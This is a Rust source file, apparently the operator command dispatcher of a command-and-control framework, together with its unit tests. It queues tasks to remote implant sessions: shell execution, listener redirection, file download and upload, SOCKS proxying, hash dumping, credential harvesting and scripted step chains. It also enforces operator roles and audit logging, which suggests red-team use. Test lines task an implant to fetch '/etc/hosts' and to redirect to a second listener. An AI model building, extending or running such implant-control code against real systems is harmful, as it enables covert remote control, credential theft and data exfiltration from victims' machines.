use std::sync::RwLock;

use uuid::Uuid;

use crate::audit_log::SharedAudit;
use crate::creds::SharedCredStore;
use crate::operators::{Operator, Role};
use crate::queue::SharedQueue;
use crate::session::SharedRegistry;
use crate::uploadstore::UploadStore;

/// Result of parsing one operator command line.
#[derive(Debug, Clone)]
pub enum Outcome {
    /// A remote task was queued for the session.
    TaskQueued {
        session: Uuid,
        task_id: Uuid,
        role: Role,
    },
    /// A local action was executed (no implant round trip).
    Local {
        message: String,
    },
    Error(String),
}

/// Central command layer so the console stays a thin front-end. Holds the
/// operator's currently-interacted session and audit log.
pub struct Dispatcher {
    pub registry: SharedRegistry,
    pub queue: SharedQueue,
    pub uploads: UploadStore,
    pub creds: SharedCredStore,
    pub operator: Operator,
    audit: Option<SharedAudit>,
    interacted: RwLock<Option<Uuid>>,
}

impl Dispatcher {
    pub fn new(
        registry: SharedRegistry,
        queue: SharedQueue,
        uploads: UploadStore,
        creds: SharedCredStore,
        operator: Operator,
    ) -> Self {
        Dispatcher {
            registry,
            queue,
            uploads,
            creds,
            operator,
            audit: None,
            interacted: RwLock::new(None),
        }
    }

    /// Attach an audit log so operator actions are recorded.
    pub fn with_audit(self, audit: SharedAudit) -> Self {
        Dispatcher {
            audit: Some(audit),
            ..self
        }
    }

    /// Record an audit entry (no-op if no audit log attached).
    async fn audit(
        &self,
        action: &str,
        target: Option<&Uuid>,
        details: &str,
        succeeded: bool,
    ) -> Result<(), String> {
        if let Some(audit) = &self.audit {
            audit
                .record(&self.operator, action, target, details, succeeded)
                .await
                .map_err(|error| error.to_string())?;
        }
        Ok(())
    }

    pub fn set_interacted(&self, id: Option<Uuid>) {
        *self.interacted.write().unwrap() = id;
    }

    pub fn interacted(&self) -> Option<Uuid> {
        *self.interacted.read().unwrap()
    }

    pub async fn parse(&self, line: &str) -> Outcome {
        let mut command_parts = line.split_whitespace();
        let command = command_parts.next().unwrap_or("");
        let command_args: Vec<_> = command_parts.collect();
        let target_hint = match command {
            "interact" | "kill" => command_args
                .first()
                .and_then(|value| Uuid::parse_str(value).ok()),
            _ => self.interacted(),
        };

        let outcome = match required_role(command) {
            Some(required) if !self.operator.role.allows(required) => Outcome::Error(format!(
                "{} role required (current role: {})",
                required, self.operator.role
            )),
            _ => self.parse_authorized(line).await,
        };

        if !command.is_empty() {
            let target = match &outcome {
                Outcome::TaskQueued { session, .. } => Some(*session),
                _ => target_hint,
            };
            let succeeded = !matches!(outcome, Outcome::Error(_));
            if let Err(error) = self
                .audit(action_name(command), target.as_ref(), line, succeeded)
                .await
            {
                return Outcome::Error(format!("audit write failed: {error}"));
            }
        }
        outcome
    }

    async fn parse_authorized(&self, line: &str) -> Outcome {
        let mut parts = line.split_whitespace();
        let cmd = parts.next().unwrap_or("");
        let args: Vec<String> = parts.map(|s| s.to_string()).collect();
        let interacted = self.interacted();
        match cmd {
            "sessions" => {
                let s = self.registry.list().await;
                if s.is_empty() {
                    Outcome::Local {
                        message: "no sessions".into(),
                    }
                } else {
                    let body = s
                        .iter()
                        .map(|x| {
                            format!(
                                "{}  {}@{}  {} {}  pid={}",
                                x.id, x.username, x.hostname, x.os, x.arch, x.pid
                            )
                        })
                        .collect::<Vec<_>>()
                        .join("\n");
                    Outcome::Local { message: body }
                }
            }
            "interact" => {
                let Some(id) = args.first().and_then(|a| Uuid::parse_str(a).ok()) else {
                    return Outcome::Error("usage: interact <session-id>".into());
                };
                if self.registry.get(&id).await.is_some() {
                    self.set_interacted(Some(id));
                    Outcome::Local {
                        message: format!("now interacting with {}", id),
                    }
                } else {
                    Outcome::Error(format!("no session {}", id))
                }
            }
            "kill" => {
                let Some(id) = args.first().and_then(|a| Uuid::parse_str(a).ok()) else {
                    return Outcome::Error("usage: kill <session-id>".into());
                };
                let removed = self.registry.remove(&id).await;
                match removed {
                    true => Outcome::Local {
                        message: format!("killed {}", id),
                    },
                    false => Outcome::Error(format!("no session {}", id)),
                }
            }
            "shell" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).await.is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                if args.is_empty() {
                    return Outcome::Error("usage: shell <command> [args...]".into());
                }
                let command = args[0].clone();
                let rest = args[1..].to_vec();
                let timeout_ms = 30_000;
                match self
                    .queue
                    .push(&sid, command.clone(), rest, timeout_ms)
                    .await
                {
                    Ok(task_id) => Outcome::TaskQueued {
                        session: sid,
                        task_id,
                        role: self.operator.role,
                    },
                    Err(e) => Outcome::Error(e.to_string()),
                }
            }
            "redirect" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).await.is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                if args.len() != 1 {
                    return Outcome::Error("usage: redirect <host>".into());
                }
                match self
                    .queue
                    .push(&sid, "nw/sethost".into(), vec![args[0].clone()], 30_000)
                    .await
                {
                    Ok(task_id) => Outcome::TaskQueued {
                        session: sid,
                        task_id,
                        role: self.operator.role,
                    },
                    Err(e) => Outcome::Error(e.to_string()),
                }
            }
            "download" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).await.is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                if args.len() != 1 {
                    return Outcome::Error("usage: download <remote-path>".into());
                }
                match self
                    .queue
                    .push(&sid, "nw/download".into(), vec![args[0].clone()], 60_000)
                    .await
                {
                    Ok(task_id) => Outcome::TaskQueued {
                        session: sid,
                        task_id,
                        role: self.operator.role,
                    },
                    Err(e) => Outcome::Error(e.to_string()),
                }
            }
            "upload" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).await.is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                let [local, dest] = args.as_slice() else {
                    return Outcome::Error("usage: upload <local-path> <remote-dest>".into());
                };
                if let Err(e) = self.uploads.start(&sid, local.into(), dest.clone()) {
                    return Outcome::Error(e);
                }
                // Queue the task that opens the destination on the agent; the job
                // is already registered so the agent's next poll starts receiving.
                match self
                    .queue
                    .push(&sid, "nw/upload".into(), vec![dest.clone()], 60_000)
                    .await
                {
                    Ok(task_id) => Outcome::TaskQueued {
                        session: sid,
                        task_id,
                        role: self.operator.role,
                    },
                    Err(e) => Outcome::Error(e.to_string()),
                }
            }
            "socks" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).await.is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                if args.len() != 1 {
                    return Outcome::Error("usage: socks <port>".into());
                }
                match self.queue.push(&sid, "nw/socks".into(), args, 10_000).await {
                    Ok(task_id) => Outcome::TaskQueued {
                        session: sid,
                        task_id,
                        role: self.operator.role,
                    },
                    Err(e) => Outcome::Error(e.to_string()),
                }
            }
            "hashes" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).await.is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                if args.len() != 1 {
                    return Outcome::Error("usage: hashes <path>".into());
                }
                match self
                    .queue
                    .push(&sid, "nw/hashes".into(), args, 30_000)
                    .await
                {
                    Ok(task_id) => Outcome::TaskQueued {
                        session: sid,
                        task_id,
                        role: self.operator.role,
                    },
                    Err(e) => Outcome::Error(e.to_string()),
                }
            }
            "jobs" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).await.is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                let list = self.queue.statuses(&sid).await;
                if list.is_empty() {
                    return Outcome::Local {
                        message: "no tasks yet".into(),
                    };
                }
                let body = list
                    .iter()
                    .map(|(cmd, st)| format!("{:?}\t{}", st, cmd))
                    .collect::<Vec<_>>()
                    .join("\n");
                Outcome::Local { message: body }
            }
            "killjob" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).await.is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                let Some(tid) = args.first().and_then(|a| Uuid::parse_str(a).ok()) else {
                    return Outcome::Error("usage: killjob <task-uuid>".into());
                };
                // A still-queued task is dropped server-side; a delivered
                // (in-flight) task is killed by tasking the implant.
                if self.queue.remove(&sid, &tid).await {
                    return Outcome::Local {
                        message: format!("removed queued task {}", tid),
                    };
                }
                match self
                    .queue
                    .push(&sid, "nw/killtask".into(), vec![tid.to_string()], 10_000)
                    .await
                {
                    Ok(_) => Outcome::Local {
                        message: format!("kill requested for {}", tid),
                    },
                    Err(e) => Outcome::Error(e.to_string()),
                }
            }
            "script" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).await.is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                if args.len() != 1 {
                    return Outcome::Error("usage: script <file-path>".into());
                }
                let content = match std::fs::read_to_string(&args[0]) {
                    Ok(c) => c,
                    Err(e) => return Outcome::Error(format!("read {}: {}", args[0], e)),
                };
                let script = match nw_modules::Script::parse(&content) {
                    Ok(s) => s,
                    Err(e) => return Outcome::Error(format!("parse script: {}", e)),
                };
                let order = script.topo_sorted();
                let mut queued = 0;
                for step in &order {
                    match self
                        .queue
                        .push(
                            &sid,
                            step.command.clone(),
                            step.args.clone(),
                            step.timeout_ms,
                        )
                        .await
                    {
                        Ok(_) => queued += 1,
                        Err(e) => {
                            return Outcome::Error(format!(
                                "failed to queue step '{}' of '{}': {}",
                                step.name, script.name, e
                            ));
                        }
                    }
                }
                Outcome::Local {
                    message: format!(
                        "script '{}' queued {} step(s) to {}",
                        script.name, queued, sid
                    ),
                }
            }
            "creds" => {
                let Some(sid) = interacted else {
                    return Outcome::Error("must 'interact' a session first".into());
                };
                if self.registry.get(&sid).await.is_none() {
                    return Outcome::Error(format!("no session {}", sid));
                }
                if args.is_empty() {
                    // List harvested credentials for this session.
                    let list = self.creds.list(&sid.to_string()).await;
                    if list.is_empty() {
                        return Outcome::Local {
                            message: "no credentials harvested for this session".into(),
                        };
                    }
                    let body = list
                        .iter()
                        .map(|c| format!("{}  {}  {}", c.source, c.cred_type, c.id))
                        .collect::<Vec<_>>()
                        .join("\n");
                    return Outcome::Local { message: body };
                }
                match args[0].as_str() {
                    "--all" => {
                        if !self.operator.role.allows(Role::Admin) {
                            return Outcome::Error("admin role required for --all".into());
                        }
                        let list = self.creds.list_all().await;
                        if list.is_empty() {
                            return Outcome::Local {
                                message: "no credentials harvested".into(),
                            };
                        }
                        let body = list
                            .iter()
                            .map(|c| {
                                format!("{}  {}  session={}", c.source, c.cred_type, c.session_id)
                            })
                            .collect::<Vec<_>>()
                            .join("\n");
                        Outcome::Local { message: body }
                    }
                    "--harvest" => {
                        match self
                            .queue
                            .push(&sid, "nw/creds".into(), vec![], 30_000)
                            .await
                        {
                            Ok(task_id) => Outcome::TaskQueued {
                                session: sid,
                                task_id,
                                role: self.operator.role,
                            },
                            Err(e) => Outcome::Error(e.to_string()),
                        }
                    }
                    _ => Outcome::Error("usage: creds [--all | --harvest]".into()),
                }
            }
            "" => Outcome::Local {
                message: String::new(),
            },
            other => Outcome::Error(format!("unknown command: {}", other)),
        }
    }
}

fn required_role(command: &str) -> Option<Role> {
    match command {
        "sessions" | "interact" | "jobs" => Some(Role::Viewer),
        "shell" | "redirect" | "download" | "upload" | "socks" | "hashes" | "creds" | "script"
        | "killjob" | "kill" => Some(Role::Operator),
        "" => None,
        _ => Some(Role::Viewer),
    }
}

fn action_name(command: &str) -> &'static str {
    match command {
        "sessions" => "session.list",
        "interact" => "session.interact",
        "kill" => "session.kill",
        "shell" => "task.shell",
        "redirect" => "task.redirect",
        "download" => "task.download",
        "upload" => "task.upload",
        "socks" => "task.socks",
        "hashes" => "task.hashes",
        "creds" => "cred.harvest",
        "script" => "automation.run",
        "jobs" => "task.list",
        "killjob" => "task.cancel",
        _ => "command.unknown",
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::queue::TaskQueue;
    use crate::session::SessionRegistry;
    use std::sync::Arc;

    async fn disp() -> (Dispatcher, Uuid) {
        let reg = Arc::new(SessionRegistry::new());
        let q = Arc::new(TaskQueue::new());
        let sid = reg
            .create(
                "h".into(),
                "u".into(),
                "nix".into(),
                "x".into(),
                1,
                "ip".into(),
                [7u8; 32],
            )
            .await;
        let op = crate::operators::Operator {
            id: Uuid::nil(),
            username: "system".into(),
            role: crate::operators::Role::Admin,
        };
        let empty_pool = crate::creds::CredentialStore::new_in_memory();
        (
            Dispatcher::new(reg, q, UploadStore::default(), Arc::new(empty_pool), op),
            sid,
        )
    }

    #[tokio::test]
    async fn sessions_lists_one() {
        let (d, _) = disp().await;
        match d.parse("sessions").await {
            Outcome::Local { message } => assert!(message.contains('@')),
            _ => panic!("expected Local"),
        }
    }

    #[tokio::test]
    async fn shell_requires_interaction() {
        let (d, _) = disp().await;
        assert!(matches!(d.parse("shell echo hi").await, Outcome::Error(_)));
    }

    #[tokio::test]
    async fn interact_then_shell_queues() {
        let (d, sid) = disp().await;
        assert!(matches!(
            d.parse(&format!("interact {}", sid)).await,
            Outcome::Local { .. }
        ));
        match d.parse("shell echo hi").await {
            Outcome::TaskQueued { session, .. } => assert_eq!(session, sid),
            other => panic!("expected TaskQueued, got {:?}", other),
        }
    }

    #[tokio::test]
    async fn redirect_queues_sethost_task() {
        let (d, sid) = disp().await;
        assert!(matches!(
            d.parse(&format!("interact {}", sid)).await,
            Outcome::Local { .. }
        ));

        let task_id = match d.parse("redirect http://second-listener:8081").await {
            Outcome::TaskQueued {
                session, task_id, ..
            } => {
                assert_eq!(session, sid);
                task_id
            }
            other => panic!("expected TaskQueued, got {:?}", other),
        };
        let queued = d.queue.drain(&sid).await;
        assert_eq!(queued.len(), 1);
        assert_eq!(queued[0].id, task_id);
        assert_eq!(queued[0].command, "nw/sethost");
        assert_eq!(queued[0].args, ["http://second-listener:8081"]);
        assert_eq!(queued[0].timeout_ms, 30_000);
    }

    #[tokio::test]
    async fn download_queues_nw_download_task() {
        let (d, sid) = disp().await;
        assert!(matches!(
            d.parse(&format!("interact {}", sid)).await,
            Outcome::Local { .. }
        ));
        let task_id = match d.parse("download /etc/hosts").await {
            Outcome::TaskQueued {
                session, task_id, ..
            } => {
                assert_eq!(session, sid);
                task_id
            }
            other => panic!("expected TaskQueued, got {:?}", other),
        };
        let queued = d.queue.drain(&sid).await;
        assert_eq!(queued[0].id, task_id);
        assert_eq!(queued[0].command, "nw/download");
        assert_eq!(queued[0].args, ["/etc/hosts"]);
    }

    #[tokio::test]
    async fn redirect_requires_one_host_for_an_active_session() {
        let (d, sid) = disp().await;
        assert!(matches!(
            d.parse("redirect http://second-listener:8081").await,
            Outcome::Error(_)
        ));
        assert!(matches!(
            d.parse(&format!("interact {}", sid)).await,
            Outcome::Local { .. }
        ));
        assert!(matches!(d.parse("redirect").await, Outcome::Error(_)));
        assert!(matches!(
            d.parse("redirect http://one http://two").await,
            Outcome::Error(_)
        ));
        assert!(d.registry.remove(&sid).await);
        assert!(matches!(
            d.parse("redirect http://second-listener:8081").await,
            Outcome::Error(_)
        ));
    }

    #[tokio::test]
    async fn kill_removes_session() {
        let (d, sid) = disp().await;
        let mut found_local = false;
        if let Outcome::Local { message } = d.parse(&format!("kill {}", sid)).await {
            assert!(message.contains("killed"));
            found_local = true;
        }
        assert!(found_local);
        assert!(
            matches!(d.parse("sessions").await, Outcome::Local { message } if message == "no sessions")
        );
    }

    #[tokio::test]
    async fn killjob_drops_queued_task() {
        let (d, sid) = disp().await;
        assert!(matches!(
            d.parse(&format!("interact {}", sid)).await,
            Outcome::Local { .. }
        ));
        let tid = match d.parse("shell sleep 30").await {
            Outcome::TaskQueued { task_id, .. } => task_id,
            other => panic!("expected TaskQueued, got {:?}", other),
        };
        match d.parse(&format!("killjob {}", tid)).await {
            Outcome::Local { message } => assert!(message.contains("removed")),
            other => panic!("expected Local, got {:?}", other),
        }
        assert!(d.queue.drain(&sid).await.is_empty());
    }

    #[tokio::test]
    async fn viewer_cannot_queue_shell_tasks() {
        let (mut d, sid) = disp().await;
        d.operator.role = crate::operators::Role::Viewer;
        d.set_interacted(Some(sid));

        assert!(matches!(
            d.parse("shell echo denied").await,
            Outcome::Error(_)
        ));
        assert!(d.queue.drain(&sid).await.is_empty());
    }

    #[tokio::test]
    async fn operator_can_queue_shell_tasks() {
        let (mut d, sid) = disp().await;
        d.operator.role = crate::operators::Role::Operator;
        d.set_interacted(Some(sid));

        assert!(matches!(
            d.parse("shell echo allowed").await,
            Outcome::TaskQueued {
                role: crate::operators::Role::Operator,
                ..
            }
        ));
    }

    #[tokio::test]
    async fn every_operator_command_is_audited() {
        let pool = crate::persist::open_pool(":memory:").await.unwrap();
        let audit = std::sync::Arc::new(crate::audit_log::AuditLog::new(pool.clone()));
        let store = crate::operators::OperatorStore::new(pool);
        let op_id = store
            .create("auditor", "password", crate::operators::Role::Operator)
            .await
            .unwrap();

        let (mut d, sid) = disp().await;
        d.operator = crate::operators::Operator {
            id: op_id,
            username: "auditor".into(),
            role: crate::operators::Role::Operator,
        };
        let d = d.with_audit(audit.clone());
        d.set_interacted(Some(sid));

        assert!(matches!(
            d.parse("download /tmp/remote.txt").await,
            Outcome::TaskQueued { .. }
        ));
        let entries = audit.list(10).await;
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].action, "task.download");
        assert_eq!(
            entries[0].target_session.as_deref(),
            Some(sid.to_string().as_str())
        );
        assert!(entries[0].succeeded);
    }
}
